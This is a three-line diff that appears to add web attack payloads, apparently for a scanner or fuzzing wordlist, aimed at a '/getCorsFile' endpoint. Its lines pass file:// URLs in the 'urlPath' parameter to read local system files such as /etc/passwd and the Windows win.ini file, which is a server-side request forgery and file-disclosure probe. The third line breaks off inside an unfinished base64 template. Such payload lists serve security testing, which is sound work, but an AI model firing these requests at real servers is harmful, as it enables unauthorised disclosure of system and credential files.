@@ -1,0 +1,3 @@
+/getCorsFile?urlPath=file:///etc/passwd
+/getCorsFile?urlPath=file:///c://windows/win.ini
+/getCorsFile?urlPath={{base64(
